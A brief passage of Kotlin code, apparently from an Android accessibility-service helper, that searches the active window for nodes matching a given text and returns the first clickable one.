        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
            ?: return null
        for (node in nodes) {
            if (node.isClickable) return node
        }
        return null
    }
}
